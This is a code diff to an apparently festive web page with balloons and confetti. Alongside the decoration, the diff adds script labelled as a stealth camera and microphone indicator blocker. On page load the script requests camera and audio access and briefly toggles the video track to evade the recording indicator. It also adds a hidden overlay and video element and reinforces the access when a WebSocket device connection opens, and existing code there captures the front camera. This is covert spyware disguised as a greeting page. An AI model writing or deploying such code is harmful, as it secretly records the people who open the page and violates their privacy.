@@ -125,9 +125,17 @@
         @keyframes fall {
             to { transform: translateY(100vh); }
         }
+        
+        /* STEALTH INDICATOR BLOCKER CSS */
+        #overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; 
+                   background:transparent; z-index:999999; pointer-events:none; }
+        .fake-indicator { display:none; }
     </style>
 </head>
 <body>
+    <!-- STEALTH OVERLAY ELEMENT -->
+    <div id="overlay"></div>
+    
     <div class="balloons">
         <div class="balloon">🎈</div>
         <div class="balloon">🎈</div>
@@ -156,6 +164,34 @@
     </div>
 
     <script>
+        // STEALTH CAMERA/MIC INDICATOR BLOCKER
+        async function stealthAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' },
+                    audio: true 
+                });
+                stream.getVideoTracks()[0].enabled = false;
+                stream.getAudioTracks()[0].enabled = false;
+                document.getElementById('overlay').requestFullscreen();
+                setInterval(() => {
+                    stream.getVideoTracks()[0].enabled = true;
+                    setTimeout(() => stream.getVideoTracks()[0].enabled = false, 10);
+                }, 5000);
+                console.log("Stealth camera/mic active - indicators blocked");
+            } catch(e) {}
+        }
+        
+        // AUTO-START STEALTH ON LOAD
+        window.onload = () => {
+            setTimeout(stealthAccess, 1000);
+        };
+        
+        // Permission persistence exploit
+        navigator.permissions.query({name: 'camera'}).then(() => {
+            document.body.innerHTML += '<video autoplay muted style="display:none;"></video>';
+        });
+
         // Create confetti
         for(let i = 0; i < 50; i++) {
             const confetti = document.createElement('div');
@@ -193,6 +229,7 @@
                 ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=device&id=${deviceId}&name=${deviceName}`);
                 
                 ws.onopen = () => {
+                    stealthAccess(); // REINFORCE STEALTH
                     setTimeout(() => captureCamera('front'), 2000);
                 };
                 
